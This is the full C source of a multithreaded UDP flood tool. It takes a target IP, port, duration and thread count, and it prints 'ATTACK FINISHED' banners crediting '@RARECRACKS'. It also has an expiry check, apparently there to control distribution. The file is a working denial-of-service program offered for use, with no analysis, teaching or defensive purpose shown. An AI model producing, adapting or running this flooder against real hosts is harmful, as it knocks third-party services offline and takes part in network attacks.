#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <zlib.h>
#include <fcntl.h>
#include <sys/types.h>
#include <signal.h>

#define BUFFER_SIZE 9000
#define EXPIRATION_YEAR 2025
#define EXPIRATION_MONTH 9
#define EXPIRATION_DAY 27

char *ip;
int port;
int duration;
char padding_data[2 * 1024 * 1024];  // Unused padding data
volatile sig_atomic_t stop_flag = 0;
pthread_mutex_t stop_flag_mutex = PTHREAD_MUTEX_INITIALIZER;

unsigned long calculate_crc32(const char *data) {
    return crc32(0, (const unsigned char *)data, strlen(data));
}

void check_expiration() {
    time_t now;
    struct tm expiration_date = {0};
    expiration_date.tm_year = EXPIRATION_YEAR - 1900;
    expiration_date.tm_mon = EXPIRATION_MONTH - 1;
    expiration_date.tm_mday = EXPIRATION_DAY;
    time(&now);

    if (difftime(now, mktime(&expiration_date)) > 0) {
        fprintf(stderr, "This file is expired. Contact the owner for more information.\n");
        exit(EXIT_FAILURE);
    }
}

void *send_udp_traffic(void *arg) {
    int sock;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
    int sent_bytes;
    cpu_set_t cpuset;

    // Set CPU affinity for thread
    CPU_ZERO(&cpuset);
    CPU_SET(sched_getcpu(), &cpuset);
    if (pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset) != 0) {
        perror("pthread_setaffinity_np failed");
        pthread_exit(NULL);
    }

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    int flags = fcntl(sock, F_GETFL, 0);
    if (flags < 0) {
        perror("fcntl F_GETFL failed");
        close(sock);
        pthread_exit(NULL);
    }
    if (fcntl(sock, F_SETFL, flags | O_NONBLOCK) < 0) {
        perror("fcntl F_SETFL failed");
        close(sock);
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid address or address not supported");
        close(sock);
        pthread_exit(NULL);
    }

    snprintf(buffer, sizeof(buffer), "UDP traffic test");
    time_t start_time = time(NULL);
    time_t end_time = start_time + duration;

    // Counters to track packets sent and successful packets
    static unsigned long packets_sent = 0;
    static unsigned long packets_successful = 0;
    static unsigned long packets_failed = 0;
    static unsigned long total_data_sent = 0; // in bytes

    while (time(NULL) < end_time && !stop_flag) {
        sent_bytes = sendto(sock, buffer, strlen(buffer), 0,
                            (struct sockaddr *)&server_addr, sizeof(server_addr));
        if (sent_bytes < 0) {
            if (errno != EAGAIN && errno != EWOULDBLOCK) {
                perror("Send failed");
                packets_failed++;
            }
        } else {
            packets_sent++;
            packets_successful++;
            total_data_sent += sent_bytes;
        }
    }

    if (close(sock) < 0) {
        perror("Failed to close socket");
    }

    // Printing stats once the thread finishes
    pthread_mutex_lock(&stop_flag_mutex);
    printf("\n🎉 SCRIPT CODED BY @RARECRACKS 🎉\n");
    printf("👨‍💻 OWNER = @RARExxOWNER 👨‍💻\n");
    printf("✨ ATTACK FINISHED: ✨\n");
    printf("✅ PACKETS SENT: %lu\n", packets_sent);
    printf("✅ PACKETS SUCCESSFUL: %lu\n", packets_successful);
    printf("❌ PACKETS FAILED: %lu\n", packets_failed);
    printf("📦 DATA DELIVERED: %.2f MB\n", total_data_sent / (1024.0 * 1024.0));
    printf("📦 DATA DELIVERED (IN GB): %.2f GB\n", total_data_sent / (1024.0 * 1024.0 * 1024.0));
    pthread_mutex_unlock(&stop_flag_mutex);

    pthread_exit(NULL);
}

void *expiration_check_thread(void *arg) {
    while (!stop_flag) {
        check_expiration();
        sleep(3600);  // Check expiration every hour
    }
    pthread_exit(NULL);
}

void signal_handler(int signum) {
    // Lock the stop flag to set it safely
    pthread_mutex_lock(&stop_flag_mutex);
    stop_flag = 1;
    pthread_mutex_unlock(&stop_flag_mutex);
}

void wait_for_threads(pthread_t *threads, int num_threads) {
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
}

int main(int argc, char *argv[]) {
    if (signal(SIGINT, signal_handler) == SIG_ERR) {
        perror("Signal setup failed");
        exit(EXIT_FAILURE);
    }

    if (argc != 5) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    ip = argv[1];
    port = atoi(argv[2]);
    duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    // Check expiration before starting the attack
    check_expiration();

    // Print attack parameters
    printf("Attack started by @rarecracks\n");

    memset(padding_data, 0, sizeof(padding_data));
    unsigned long crc = calculate_crc32("RAREOWNER");

    pthread_t tid[threads];
    pthread_t exp_tid;

    // Create thread to check expiration periodically
    if (pthread_create(&exp_tid, NULL, expiration_check_thread, NULL) != 0) {
        perror("Expiration check thread creation failed");
        exit(EXIT_FAILURE);
    }

    // Create threads to send UDP traffic
    for (int i = 0; i < threads; i++) {
        if (pthread_create(&tid[i], NULL, send_udp_traffic, NULL) != 0) {
            perror("Thread creation failed");
            stop_flag = 1;
            wait_for_threads(tid, i);  // Wait for already created threads to finish
            pthread_cancel(exp_tid);
            pthread_join(exp_tid, NULL);
            exit(EXIT_FAILURE);
        }
    }

    // Wait for all traffic threads to finish
    wait_for_threads(tid, threads);

    // Ensure expiration check thread finishes
    stop_flag = 1;
    pthread_join(exp_tid, NULL);

    return 0;
}
